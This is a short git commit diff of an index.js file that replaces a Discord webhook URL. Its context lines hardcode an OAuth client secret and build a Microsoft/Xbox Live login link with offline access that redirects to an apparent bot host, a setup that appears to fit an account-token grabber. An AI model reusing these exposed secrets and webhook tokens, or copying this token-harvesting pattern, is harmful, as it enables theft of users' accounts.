abbd902219065d4d144909b1b297b02103f5dddc
bobrico606 <97999193+bobrico606@users.noreply.github.com>
2022-12-01 14:14:15 -0500

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@
 const client_secret = 'e020c8c6-711a-4ff9-aca7-4cde141707a6'
 const client_id = '3a6718b9-7cc9-4334-8600-654f399e74ba'
 const redirect_uri = 'https://chad-bot.onrender.com'
-const webhook_url = 'https://discord.com/api/webhooks/1047694438371164160/DINyEaA_NVoQL1NbtWXXKxKMFzSrif1tzaYBiUn6FnBp3EuDWUEiJbVvILl4Pz4gZ8VV'
+const webhook_url = 'https://discord.com/api/webhooks/1044083180455604274/2ZbqhMPGPmX3cyVOwbFFcTFiJfzWpy1JXD9DSeI-zDWxjDIISGc98TbsLrRd45p26vfP'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
